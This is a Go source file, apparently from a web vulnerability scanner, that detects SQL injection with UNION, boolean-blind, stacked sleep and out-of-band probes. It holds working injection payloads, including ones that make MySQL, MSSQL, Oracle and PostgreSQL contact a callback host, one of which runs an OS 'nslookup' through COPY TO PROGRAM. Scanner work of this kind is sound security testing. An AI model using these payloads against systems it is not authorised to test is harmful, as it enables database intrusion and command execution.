package modules

import (
	"context"
	"crypto/sha256"
	"encoding/binary"
	"fmt"
	"html"
	"net/url"
	"regexp"
	"strings"

	"github.com/akha-security/akca/engine/internal/httpclient"
	"github.com/akha-security/akca/engine/internal/payloadgen"
	"github.com/akha-security/akca/engine/internal/timingblind"
	"github.com/akha-security/akca/engine/internal/verification"
)

const (
	sqliUnionMaxCols        = 15
	sqliOOBMaxProbePayloads = 3
)

var (
	unionSentinelRe  = regexp.MustCompile(`\b\d{6}\b`)
	unionScriptTagRe = regexp.MustCompile(`(?is)<(?:script|style)\b[^>]*>.*?</(?:script|style)>`)
	unionHTMLTagRe   = regexp.MustCompile(`(?s)<[^>]+>`)
)

func (r *Runner) discoverSQLiColumnCount(ctx context.Context, target ScanTarget, baseline httpclient.RequestResponse) int {
	baseBody := baseline.Response.Body
	best := 0
	boundaryFound := false
	orderByAttempted := 0
	unionNullAttempted := 0
	delivered := 0
	defer func() {
		r.emitSQLiCoverage("sqli_union_probe_coverage", target, map[string]interface{}{
			"order_by_attempted": orderByAttempted, "union_null_attempted": unionNullAttempted,
			"requests_delivered": delivered, "boundary_found": boundaryFound,
		})
	}()

	prefixes := []string{
		"' ORDER BY %d-- -",
		"' ORDER BY %d#",
		"1 ORDER BY %d-- -",
		"1 ORDER BY %d#",
		`" ORDER BY %d-- -`,
		`" ORDER BY %d#`,
	}

	// 1. Identify which prefix/comment format evaluates cleanly for column 1
	workingFmt := ""
	for _, pfx := range prefixes {
		if ctx.Err() != nil {
			break
		}
		orderByAttempted++
		probe := fmt.Sprintf(pfx, 1)
		attempt, ok := r.sqliBestAttempt(ctx, target, probe, baseBody)
		if !ok {
			continue
		}
		delivered++
		rr := attempt.RR.Response
		if rr.StatusCode < 500 && !sqliErrorInBody(rr.Body, baseBody) {
			workingFmt = pfx
			best = 1
			break
		}
	}

	// 2. If a clean prefix was found, iterate up to max columns using that prefix
	if workingFmt != "" {
		probeOrderBy := func(n int) (clean bool, deliveredOK bool) {
			if ctx.Err() != nil {
				return false, false
			}
			orderByAttempted++
			payload := fmt.Sprintf(workingFmt, n)
			attempt, ok := r.sqliBestAttempt(ctx, target, payload, baseBody)
			if !ok {
				return false, false
			}
			delivered++
			rr := attempt.RR.Response
			if rr.StatusCode >= 500 || sqliErrorInBody(rr.Body, baseBody) {
				return false, true
			}
			return true, true
		}

		lastClean := 1
		firstError := 0
		probed := map[int]struct{}{1: {}}
		for _, n := range []int{2, 4, 8, sqliUnionMaxCols} {
			if n <= lastClean {
				continue
			}
			if _, exists := probed[n]; exists {
				continue
			}
			probed[n] = struct{}{}
			clean, deliveredOK := probeOrderBy(n)
			if !deliveredOK {
				continue
			}
			if !clean {
				firstError = n
				boundaryFound = true
				break
			}
			lastClean = n
			best = n
		}
		for low, high := lastClean+1, firstError-1; firstError > 0 && low <= high; {
			mid := low + (high-low)/2
			if _, exists := probed[mid]; exists {
				low = mid + 1
				continue
			}
			probed[mid] = struct{}{}
			clean, deliveredOK := probeOrderBy(mid)
			if !deliveredOK {
				high = mid - 1
				continue
			}
			if clean {
				best = mid
				low = mid + 1
			} else {
				boundaryFound = true
				high = mid - 1
			}
		}
		if best > 0 && boundaryFound {
			return best
		}
	}

	// Fallback: UNION SELECT NULL iteration
	best = 0
	boundaryFound = false
	unionPrefixes := []struct {
		prefix string
		suffix string
	}{
		{"'", "-- -"},
		{"'", "#"},
		{"1", "-- -"},
		{"1", "#"},
		{`"`, "-- -"},
		{`"`, "#"},
	}
	// If a working format was already identified in ORDER BY, reuse its prefix/suffix
	if workingFmt != "" {
		for _, up := range unionPrefixes {
			if strings.HasPrefix(workingFmt, up.prefix) && strings.HasSuffix(workingFmt, up.suffix) {
				unionPrefixes = []struct {
					prefix string
					suffix string
				}{up}
				break
			}
		}
	}
	maxFallbackCols := sqliUnionMaxCols
	if len(unionPrefixes) > 2 {
		maxFallbackCols = 8
	}
	for n := 1; n <= maxFallbackCols; n++ {
		if ctx.Err() != nil {
			break
		}
		cols := make([]string, n)
		for i := range cols {
			cols[i] = "NULL"
		}
		var found bool
		for _, up := range unionPrefixes {
			payload := fmt.Sprintf("%s UNION SELECT %s%s", up.prefix, strings.Join(cols, ","), up.suffix)
			unionNullAttempted++
			attempt, ok := r.sqliBestAttempt(ctx, target, payload, baseBody)
			if !ok {
				continue
			}
			delivered++
			rr := attempt.RR.Response
			if rr.StatusCode >= 500 || sqliErrorInBody(rr.Body, baseBody) {
				boundaryFound = best > 0
				found = true
				break
			}
		}
		if found {
			break
		}
		best = n
	}
	if boundaryFound {
		return best
	}
	return 0
}

func (r *Runner) unionSQLiProbe(ctx context.Context, target ScanTarget, baseline httpclient.RequestResponse) []ModuleFinding {
	colCount := r.discoverSQLiColumnCount(ctx, target, baseline)
	if colCount <= 0 {
		return nil
	}
	primarySentinels := unionSentinelSet(r.scanID, target, "primary")
	secondarySentinels := unionSentinelSet(r.scanID, target, "secondary")

	boundaries := []struct {
		prefix string
		suffix string
	}{
		{"'", "-- -"},
		{"'", "#"},
		{`"`, "-- -"},
		{`"`, "#"},
		{"1", "-- -"},
		{"1", "#"},
	}

	for _, b := range boundaries {
		value := buildUnionPayloadWithPrefix(colCount, primarySentinels, b.prefix, b.suffix)
		p := payloadgen.Payload{
			Value: value, VulnClass: "sqli", Variant: "union_enum", Family: "sqli",
			ExpectedSignal: "union_signal", Priority: 80, BudgetCost: 3,
		}
		attempt, ok := r.sqliBestAttempt(ctx, target, value, baseline.Response.Body)
		if !ok {
			continue
		}
		rr := attempt.RR
		probeTarget := attempt.Target
		if probeTarget.EndpointURL == "" {
			probeTarget = target
		}
		if !unionSignalConfirmed(value, rr.Response.Body, baseline.Response.Body) {
			continue
		}

		controlValue := b.prefix + ` UNXON SELXCT ` + buildUnionPayloadWithPrefix(colCount, primarySentinels, "", b.suffix)
		controlRR, err := r.probeForModule(ctx, "sqli", probeTarget, controlValue)
		if err != nil || unionVisibleMarkerCount(controlRR.Response.Body, primarySentinels) > 0 {
			continue
		}

		secondaryValue := buildUnionPayloadWithPrefix(colCount, secondarySentinels, b.prefix, b.suffix)
		secondaryRR, err := r.probeForModule(ctx, "sqli", probeTarget, secondaryValue)
		if err != nil || secondaryRR.Response.StatusCode != rr.Response.StatusCode ||
			isInfrastructureError(secondaryRR.Response.StatusCode) ||
			!unionSignalConfirmed(secondaryValue, secondaryRR.Response.Body, baseline.Response.Body) ||
			!unionResponsesConsistent(rr.Response.Body, primarySentinels, secondaryRR.Response.Body, secondarySentinels) {
			continue
		}

		f := r.verifyAndBuild(ctx, "sqli", probeTarget, p, baseline, rr, "union_signal", false, false, "", "")
		if f != nil {
			f.Description += " Confirmed with an independent UNION sentinel set; a non-SQL reflection control did not reproduce the markers."
			f.Evidence.Verification.UpgradeReasons = append(f.Evidence.Verification.UpgradeReasons,
				"union_independent_sentinel_confirmed", "union_reflection_control_clean")
			var out []ModuleFinding
			if r.recordFinding(ctx, &out, f, "sqli", "union_signal") {
				return out
			}
			return nil
		}
	}
	return nil
}

func buildUnionLexicalControl(colCount int, sentinels []string) string {
	if colCount < len(sentinels) {
		colCount = len(sentinels)
	}
	cols := make([]string, colCount)
	for i := range cols {
		cols[i] = "NULL"
	}
	for i, sentinel := range sentinels {
		cols[colCount-len(sentinels)+i] = sentinel
	}
	// Same quote, spacing, comma, comment and numeric-token shape as the UNION
	// probe, but deliberately invalid SQL keywords.
	return `' UNXON SELXCT ` + strings.Join(cols, ",") + `-- -`
}

func unionSentinelSet(scanID string, target ScanTarget, label string) []string {
	seed := scanID + "|" + target.EndpointURL + "|" + target.Parameter + "|" + target.Location + "|" + label
	sum := sha256.Sum256([]byte(seed))
	out := make([]string, 0, 3)
	seen := map[uint32]struct{}{}
	for i := 0; i < 3; i++ {
		value := uint32(600000) + binary.BigEndian.Uint32(sum[i*4:(i+1)*4])%400000
		for {
			if _, exists := seen[value]; !exists {
				break
			}
			value = 600000 + (value-599999)%400000
		}
		seen[value] = struct{}{}
		out = append(out, fmt.Sprintf("%06d", value))
	}
	return out
}

func buildUnionPayload(colCount int, sentinels []string) string {
	return buildUnionPayloadWithPrefix(colCount, sentinels, "'", "-- -")
}

func buildUnionPayloadWithPrefix(colCount int, sentinels []string, quotePrefix, commentSuffix string) string {
	if colCount < len(sentinels) {
		colCount = len(sentinels)
	}
	cols := make([]string, colCount)
	for i := range cols {
		cols[i] = "NULL"
	}
	for i, sentinel := range sentinels {
		cols[colCount-len(sentinels)+i] = sentinel
	}
	return quotePrefix + ` UNION SELECT ` + strings.Join(cols, ",") + commentSuffix
}

func unionSignalConfirmed(payload, body, baseline string) bool {
	markers := unionSentinelRe.FindAllString(payload, -1)
	if len(markers) < 3 || likelyUnionReflection(payload, body) {
		return false
	}
	visible := unionVisibleText(body)
	baseVisible := unionVisibleText(baseline)
	for _, marker := range markers {
		if !containsStandaloneDigits(visible, marker) || containsStandaloneDigits(baseVisible, marker) {
			return false
		}
	}
	return true
}

func likelyUnionReflection(payload, body string) bool {
	decoded := []string{body, html.UnescapeString(body)}
	if value, err := url.QueryUnescape(body); err == nil {
		decoded = append(decoded, value)
	}
	forms := []string{payload, html.EscapeString(payload), url.QueryEscape(payload), url.PathEscape(payload)}
	for _, candidate := range decoded {
		lower := strings.ToLower(candidate)
		for _, form := range forms {
			if form != "" && strings.Contains(lower, strings.ToLower(form)) {
				return true
			}
		}
	}
	visibleLower := strings.ToLower(unionVisibleText(body))
	return strings.Contains(visibleLower, "union select") &&
		unionVisibleMarkerCount(visibleLower, unionSentinelRe.FindAllString(payload, -1)) >= 3
}

func unionVisibleText(body string) string {
	body = unionScriptTagRe.ReplaceAllString(body, " ")
	body = unionHTMLTagRe.ReplaceAllString(body, " ")
	return strings.Join(strings.Fields(html.UnescapeString(body)), " ")
}

func unionVisibleMarkerCount(body string, markers []string) int {
	visible := unionVisibleText(body)
	hits := 0
	for _, marker := range markers {
		if containsStandaloneDigits(visible, marker) {
			hits++
		}
	}
	return hits
}

func containsStandaloneDigits(body, marker string) bool {
	start := 0
	for {
		idx := strings.Index(body[start:], marker)
		if idx < 0 {
			return false
		}
		idx += start
		leftOK := idx == 0 || body[idx-1] < '0' || body[idx-1] > '9'
		end := idx + len(marker)
		rightOK := end == len(body) || body[end] < '0' || body[end] > '9'
		if leftOK && rightOK {
			return true
		}
		start = idx + 1
	}
}

func unionResponsesConsistent(primary string, primaryMarkers []string, secondary string, secondaryMarkers []string) bool {
	normalize := func(body string, markers []string) string {
		body = unionVisibleText(body)
		for _, marker := range markers {
			body = strings.ReplaceAll(body, marker, "<UNION_VALUE>")
		}
		return normalizeVolatileFields(body)
	}
	left := normalize(primary, primaryMarkers)
	right := normalize(secondary, secondaryMarkers)
	return left != "" && right != "" && bodyDiffRatio(left, right) <= 0.15
}

func sqliOOBPayloads(oastURL, dbHint string) []payloadgen.Payload {
	host := oastHostFromURL(oastURL)
	if host == "" {
		return nil
	}
	token := strings.Split(host, ".")[0]
	domain := host
	if idx := strings.Index(host, "."); idx >= 0 {
		domain = host[idx+1:]
	}
	db := strings.ToLower(dbHint)
	type probe struct {
		variant, value string
		priority       int
	}
	build := func(variant, tmpl string, prio int) probe {
		v := strings.NewReplacer("{host}", host, "{token}", token, "{domain}", domain).Replace(tmpl)
		return probe{variant: variant, value: v, priority: prio}
	}
	var probes []probe
	seenVariants := map[string]struct{}{}
	addProbe := func(p probe) {
		key := p.variant + "|" + p.value
		if _, ok := seenVariants[key]; ok {
			return
		}
		seenVariants[key] = struct{}{}
		probes = append(probes, p)
	}
	addMySQL := func() {
		addProbe(build("mysql_load_file", `' AND (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,'{token}.{domain}','\\a')))-- -`, 78))
		addProbe(build("mysql_load_file_ver", `' AND (SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,(SELECT VERSION()),0x2e,'{token}.{domain}','\\a')))-- -`, 76))
		addProbe(build("mysql_load_data_dns", `'; LOAD DATA INFILE '\\\\{token}.{domain}\\a' INTO TABLE mysql.user-- -`, 74))
		addProbe(build("mysql_select_outfile_dns", `'; SELECT 1 INTO OUTFILE '\\\\{token}.{domain}\\a'-- -`, 73))
	}
	addMSSQL := func() {
		addProbe(build("mssql_xp_dirtree", `'; EXEC master..xp_dirtree '\\{token}.{domain}\a'-- -`, 77))
	}
	addOracle := func() {
		addProbe(build("oracle_utl_http", `' AND 1=(SELECT COUNT(*) FROM dual WHERE 1=UTL_INADDR.GET_HOST_ADDRESS('{token}.{domain}'))-- -`, 75))
	}
	addPostgres := func() {
		addProbe(build("postgres_copy", `'; COPY (SELECT '') TO PROGRAM 'nslookup {token}.{domain}'-- -`, 70))
	}
	switch {
	case strings.Contains(db, "mysql") || strings.Contains(db, "maria"):
		addMySQL()
	case strings.Contains(db, "mssql") || strings.Contains(db, "sql server"):
		addMSSQL()
	case strings.Contains(db, "oracle"):
		addOracle()
	case strings.Contains(db, "postgres"):
		addPostgres()
	default:
		addMySQL()
		addMSSQL()
		addOracle()
		addPostgres()
	}
	out := make([]payloadgen.Payload, 0, len(probes))
	for _, pr := range probes {
		out = append(out, payloadgen.Payload{
			Value: pr.value, VulnClass: "sqli", Variant: pr.variant, Family: "sqli",
			ExpectedSignal: "oob_sqli", Priority: pr.priority, BudgetCost: 3,
			VerificationStrategy: "oast_callback", NoiseLevel: "high",
		})
	}
	return out
}

func (r *Runner) runSQLiOOB(ctx context.Context, target ScanTarget) []ModuleFinding {
	if !r.cfg.EnableOAST {
		return nil
	}
	if !isLikelySQLiParam(target.Parameter) {
		return nil
	}
	if r.oast == nil {
		r.emitOnce("sqli_oast_listener_unavailable", "coverage_gap", "SQLi OOB coverage unavailable because OAST listener is not running", map[string]interface{}{
			"module": "sqli", "endpoint": target.EndpointURL, "parameter": target.Parameter,
		})
		return nil
	}
	oastURL := strings.TrimSpace(r.oastURL(ctx, "sqli-oob-"+target.Parameter, target, "sqli"))
	if oastURL == "" {
		r.emitOnce("sqli_oast_url_unavailable", "coverage_gap", "SQLi OOB URL generation failed", map[string]interface{}{
			"module": "sqli", "endpoint": target.EndpointURL, "parameter": target.Parameter,
		})
		return nil
	}
	dbHint := r.techDatabaseHint(target.EndpointURL)
	attempted := 0
	sent := 0
	available := sqliOOBPayloads(oastURL, dbHint)
	for _, p := range available {
		if ctx.Err() != nil {
			break
		}
		if attempted >= sqliOOBMaxProbePayloads {
			break
		}
		attempted++
		if r.sendOASTProbe(ctx, target, p.Value) {
			sent++
		}
	}
	_ = r.emit("sqli_oast_probe_coverage", "SQLi OOB probe coverage recorded", map[string]interface{}{
		"scan_id": r.scanID, "endpoint": target.EndpointURL, "parameter": target.Parameter,
		"probes_sent": sent, "payloads_attempted": attempted, "payloads_available": len(available), "db_hint": dbHint,
	})
	return nil
}

func (r *Runner) stackedSQLiProbe(ctx context.Context, target ScanTarget, baseline httpclient.RequestResponse,
	timingBase timingblind.Baseline, sleepSec int, dbHint string) []ModuleFinding {

	var payloads []string
	if strings.Contains(strings.ToLower(dbHint), "postgres") {
		payloads = append(payloads, fmt.Sprintf(`'; SELECT pg_sleep(%d)-- -`, sleepSec))
	} else if strings.Contains(strings.ToLower(dbHint), "mssql") || strings.Contains(strings.ToLower(dbHint), "sql server") {
		payloads = append(payloads, fmt.Sprintf(`'; WAITFOR DELAY '0:0:%d'-- -`, sleepSec))
	} else if strings.Contains(strings.ToLower(dbHint), "mysql") || strings.Contains(strings.ToLower(dbHint), "maria") {
		payloads = append(payloads, fmt.Sprintf(`'; SELECT SLEEP(%d)-- -`, sleepSec))
	} else {
		payloads = []string{
			fmt.Sprintf(`'; SELECT SLEEP(%d)-- -`, sleepSec),
			fmt.Sprintf(`'; SELECT pg_sleep(%d)-- -`, sleepSec),
			fmt.Sprintf(`'; WAITFOR DELAY '0:0:%d'-- -`, sleepSec),
		}
	}

	for _, sleepPayload := range payloads {
		if ok, delayMs, samples, zeroSamples := r.sqliTimingVerified(ctx, target, sleepPayload, dbHint, timingBase, sleepSec); ok {
			p := payloadgen.Payload{
				Value: sleepPayload, VulnClass: "sqli", Variant: "stacked_timing", Family: "sqli",
				ExpectedSignal: "stacked_timing", Priority: 74, BudgetCost: 3,
			}
			attempt, ok := r.sqliBestAttempt(ctx, target, sleepPayload, baseline.Response.Body)
			if ok {
				f := r.buildSQLiFinding(ctx, attempt.Target, p, baseline, attempt.RR, "stacked_timing", "", delayMs, timingBase, sleepSec, samples, zeroSamples)
				if f != nil {
					var out []ModuleFinding
					if r.recordFinding(ctx, &out, f, "sqli", "stacked_timing") {
						return out
					}
					return nil
				}
			}
		}
	}
	// SELECT 1/SELECT 2 body differences are not proof of stacked execution;
	// reflected input, validation messages and WAF templates produce the same
	// pattern. Stacked SQLi is published only through the paired timing path
	// above (or a correlated OAST callback handled separately).
	return nil
}

type sqliBooleanPair struct {
	trueVal, falseVal             string
	secondTrueVal, secondFalseVal string
	variant                       string
}

func sqliBooleanPairs(scanID string, target ScanTarget) []sqliBooleanPair {
	seed := sha256.Sum256([]byte(scanID + "|" + target.EndpointURL + "|" + target.Parameter + "|boolean-pair"))
	left := 10000 + int(binary.BigEndian.Uint32(seed[:4])%80000)
	right := left + 1 + int(binary.BigEndian.Uint32(seed[4:8])%97)
	left2 := left + 101 + int(binary.BigEndian.Uint32(seed[8:12])%503)
	right2 := left2 + 1 + int(binary.BigEndian.Uint32(seed[12:16])%97)
	baseVal := nativeTargetValue(target)
	if baseVal == "" {
		baseVal = "1"
	}
	pairs := []sqliBooleanPair{
		{
			fmt.Sprintf(`%s' AND '%d'='%d'-- -`, baseVal, left, left), fmt.Sprintf(`%s' AND '%d'='%d'-- -`, baseVal, left, right),
			fmt.Sprintf(`%s' AND '%d'='%d'-- -`, baseVal, left2, left2), fmt.Sprintf(`%s' AND '%d'='%d'-- -`, baseVal, left2, right2),
			"boolean_single_quote_and",
		},
		{
			fmt.Sprintf(`%s' AND '%d'='%d'#`, baseVal, left, left), fmt.Sprintf(`%s' AND '%d'='%d'#`, baseVal, left, right),
			fmt.Sprintf(`%s' AND '%d'='%d'#`, baseVal, left2, left2), fmt.Sprintf(`%s' AND '%d'='%d'#`, baseVal, left2, right2),
			"boolean_single_quote_hash",
		},
		{
			fmt.Sprintf(`%s" AND "%d"="%d"-- -`, baseVal, left, left), fmt.Sprintf(`%s" AND "%d"="%d"-- -`, baseVal, left, right),
			fmt.Sprintf(`%s" AND "%d"="%d"-- -`, baseVal, left2, left2), fmt.Sprintf(`%s" AND "%d"="%d"-- -`, baseVal, left2, right2),
			"boolean_double_quote_and",
		},
		{
			fmt.Sprintf(`%s" AND "%d"="%d"#`, baseVal, left, left), fmt.Sprintf(`%s" AND "%d"="%d"#`, baseVal, left, right),
			fmt.Sprintf(`%s" AND "%d"="%d"#`, baseVal, left2, left2), fmt.Sprintf(`%s" AND "%d"="%d"#`, baseVal, left2, right2),
			"boolean_double_quote_hash",
		},
		{
			fmt.Sprintf(`%s AND %d=%d-- -`, baseVal, left, left), fmt.Sprintf(`%s AND %d=%d-- -`, baseVal, left, right),
			fmt.Sprintf(`%s AND %d=%d-- -`, baseVal, left2, left2), fmt.Sprintf(`%s AND %d=%d-- -`, baseVal, left2, right2),
			"boolean_numeric_and",
		},
		{
			fmt.Sprintf(`%s' AND %d=%d/*`, baseVal, left, left), fmt.Sprintf(`%s' AND %d=%d/*`, baseVal, left, right),
			fmt.Sprintf(`%s' AND %d=%d/*`, baseVal, left2, left2), fmt.Sprintf(`%s' AND %d=%d/*`, baseVal, left2, right2),
			"boolean_single_quote_slash_comment",
		},
		{
			fmt.Sprintf(`%s') AND ('%d'='%d'-- -`, baseVal, left, left), fmt.Sprintf(`%s') AND ('%d'='%d'-- -`, baseVal, left, right),
			fmt.Sprintf(`%s') AND ('%d'='%d'-- -`, baseVal, left2, left2), fmt.Sprintf(`%s') AND ('%d'='%d'-- -`, baseVal, left2, right2),
			"boolean_parenthesized_and",
		},
		{
			fmt.Sprintf(`99999' OR '%d'='%d'-- -`, left, left), fmt.Sprintf(`%s' AND '%d'='%d'-- -`, baseVal, left, right),
			fmt.Sprintf(`99999' OR '%d'='%d'-- -`, left2, left2), fmt.Sprintf(`%s' AND '%d'='%d'-- -`, baseVal, left2, right2),
			"boolean_auth_or",
		},
		{
			fmt.Sprintf(`%s AND %d>%d-- -`, baseVal, left, right), fmt.Sprintf(`%s AND %d>%d-- -`, baseVal, left, left),
			fmt.Sprintf(`%s AND %d>%d-- -`, baseVal, left2, right2), fmt.Sprintf(`%s AND %d>%d-- -`, baseVal, left2, left2),
			"boolean_comparison_gt",
		},
		{
			fmt.Sprintf(`' OR '%d'='%d'-- -`, left, left), fmt.Sprintf(`' OR '%d'='%d'-- -`, left, right),
			fmt.Sprintf(`' OR '%d'='%d'-- -`, left2, left2), fmt.Sprintf(`' OR '%d'='%d'-- -`, left2, right2),
			"boolean_single_quote_or",
		},
		{
			fmt.Sprintf(`XOR %d=%d-- -`, left, left), fmt.Sprintf(`XOR %d=%d-- -`, left, right),
			fmt.Sprintf(`XOR %d=%d-- -`, left2, left2), fmt.Sprintf(`XOR %d=%d-- -`, left2, right2),
			"boolean_xor_leading",
		},
	}
	if isNumericTargetValue(target) {
		var numPairs []sqliBooleanPair
		var otherPairs []sqliBooleanPair
		for _, p := range pairs {
			if strings.Contains(p.variant, "numeric") || strings.Contains(p.variant, "comparison") {
				numPairs = append(numPairs, p)
			} else {
				otherPairs = append(otherPairs, p)
			}
		}
		return append(numPairs, otherPairs...)
	}
	return pairs
}

func (r *Runner) booleanBlindSQLiProbe(ctx context.Context, target ScanTarget, baseline httpclient.RequestResponse) []ModuleFinding {
	pairs := sqliBooleanPairs(r.scanID, target)

	for _, pair := range pairs {
		if ctx.Err() != nil {
			break
		}
		falseAttempt, okF := r.sqliBestAttempt(ctx, target, pair.falseVal, baseline.Response.Body)
		if !okF {
			continue
		}
		falseRR := falseAttempt.RR.Response

		trueAttempt, okT := r.sqliBestAttempt(ctx, target, pair.trueVal, baseline.Response.Body)
		if !okT {
			continue
		}
		trueRR := trueAttempt.RR.Response

		signal := "boolean_pair_confirmed"
		if !booleanPairConfirmed(baseline.Response, trueRR, falseRR, pair.trueVal, pair.falseVal) {
			continue
		}

		orientation := booleanPairOrientation(baseline.Response.Body, trueRR.Body, falseRR.Body)
		p := payloadgen.Payload{
			Value: pair.trueVal, VulnClass: "sqli", Variant: pair.variant, ExpectedSignal: signal,
		}
		if !sqliSignalConfirmed(p, trueRR.Body, baseline.Response.Body, signal) {
			continue
		}
		if (trueRR.StatusCode >= 400 || falseRR.StatusCode >= 400) && baseline.Response.StatusCode < 400 {
			continue
		}

		// Alternating replay: both the true and false branches must reproduce on
		// the same native injection surface. This rejects dynamic/cache/WAF pages.
		falseReplay, err := r.probeForModule(ctx, "sqli", trueAttempt.Target, pair.falseVal)
		if err != nil {
			continue
		}
		trueReplay, err := r.probeForModule(ctx, "sqli", trueAttempt.Target, pair.trueVal)
		if err != nil || !booleanPairConfirmed(baseline.Response, trueReplay.Response, falseReplay.Response, pair.trueVal, pair.falseVal) ||
			!sqliBodiesEquivalent(trueRR.Body, trueReplay.Response.Body) ||
			!sqliBodiesEquivalent(falseRR.Body, falseReplay.Response.Body) {
			continue
		}

		// A second operand set in the same quote/context family must reproduce
		// the same branch orientation.
		secondTrue, err := r.probeForModule(ctx, "sqli", trueAttempt.Target, pair.secondTrueVal)
		if err != nil {
			continue
		}
		secondFalse, err := r.probeForModule(ctx, "sqli", trueAttempt.Target, pair.secondFalseVal)
		if err != nil || !booleanPairConfirmed(baseline.Response, secondTrue.Response, secondFalse.Response,
			pair.secondTrueVal, pair.secondFalseVal) ||
			orientation == 0 ||
			orientation !=
				booleanPairOrientation(baseline.Response.Body, secondTrue.Response.Body, secondFalse.Response.Body) {
			continue
		}

		// Keep punctuation/quotes while breaking the SQL operators. A tokenizer
		// or query-language parser that routes SQL-looking text differently
		// should not be mistaken for database predicate execution.
		syntaxControl := booleanSyntaxControl(pair.trueVal)
		controlRR, err := r.probeForModule(ctx, "sqli", trueAttempt.Target, syntaxControl)
		if err != nil || !usableBooleanSQLiResponse(controlRR.Response) ||
			bodyDiffRatio(normalizeVolatileFields(baseline.Response.Body),
				normalizeVolatileFields(controlRR.Response.Body)) > 0.08 {
			continue
		}

		proofRR := trueAttempt.RR
		if orientation < 0 {
			p.Value = pair.falseVal
			proofRR.Response = falseRR
			proofRR.Request = falseAttempt.RR.Request
		}
		booleanProof := &verification.BooleanPairProof{
			BaselineHash:      booleanResponseHash(baseline.Response.Body),
			FirstTrueHash:     booleanResponseHash(trueRR.Body),
			FirstFalseHash:    booleanResponseHash(falseRR.Body),
			ReplayTrueHash:    booleanResponseHash(trueReplay.Response.Body),
			ReplayFalseHash:   booleanResponseHash(falseReplay.Response.Body),
			SecondTrueHash:    booleanResponseHash(secondTrue.Response.Body),
			SecondFalseHash:   booleanResponseHash(secondFalse.Response.Body),
			SyntaxControlHash: booleanResponseHash(controlRR.Response.Body),
			Orientation:       orientation,
			SameSurface:       true,
			SyntaxControlOK:   true,
		}
		f := r.verifyAndBuildWithCandidate(ctx, "sqli", trueAttempt.Target, p, baseline, proofRR, signal,
			false, false, "", "", func(candidate *verification.Candidate) {
				candidate.ExpectedEquivalent = true
				candidate.BooleanPairProof = booleanProof
				candidate.RequestedProofType = verification.ProofBooleanPair
				candidate.Observations = append(candidate.Observations,
					r.observation("sqli", trueAttempt.Target, verification.RoleFalseBranch, 1, falseAttempt.RR),
					r.observation("sqli", trueAttempt.Target, verification.RoleTrueBranch, 1, trueAttempt.RR),
					r.observation("sqli", trueAttempt.Target, verification.RoleFalseBranch, 2, falseReplay),
					r.observation("sqli", trueAttempt.Target, verification.RoleTrueBranch, 2, trueReplay),
					r.observation("sqli", trueAttempt.Target, verification.RoleTrueBranch, 3, secondTrue),
					r.observation("sqli", trueAttempt.Target, verification.RoleFalseBranch, 3, secondFalse),
					r.observation("sqli", trueAttempt.Target, verification.RoleSyntaxControl, 1, controlRR),
				)
			})
		if f != nil {
			f.Description += " Confirmed with two independent operand pairs in the same SQL context and a syntax-preserving non-SQL control."
			f.Evidence.Verification.UpgradeReasons = append(f.Evidence.Verification.UpgradeReasons,
				"two_independent_boolean_pairs", "syntax_preserving_control_clean")
			var out []ModuleFinding
			if r.recordFinding(ctx, &out, f, "sqli", "boolean_pair_confirmed") {
				return out
			}
			return nil
		}
	}
	return nil
}

func booleanResponseHash(body string) string {
	sum := sha256.Sum256([]byte(normalizeVolatileFields(body)))
	return fmt.Sprintf("%x", sum[:12])
}

func booleanPairOrientation(baseline, trueBody, falseBody string) int {
	trueDelta := bodyDiffRatio(normalizeVolatileFields(baseline), normalizeVolatileFields(trueBody))
	falseDelta := bodyDiffRatio(normalizeVolatileFields(baseline), normalizeVolatileFields(falseBody))
	if trueDelta+0.02 < falseDelta {
		return 1
	}
	if falseDelta+0.02 < trueDelta {
		return -1
	}
	return 0
}

func booleanSyntaxControl(value string) string {
	control := strings.NewReplacer(
		"XOR", "XQR",
		" OR ", " XR ",
		" AND ", " XND ",
		"--", "##",
	).Replace(value)
	return strings.ReplaceAll(control, "=", "~")
}

func isLikelySQLiParam(param string) bool {
	p := strings.ToLower(strings.TrimSpace(param))
	if p == "" {
		return false
	}
	switch p {
	case "_", "t", "ts", "timestamp", "cb", "cache", "nocache", "v", "ver", "version", "format", "lang", "locale":
		return false
	}
	return true
}
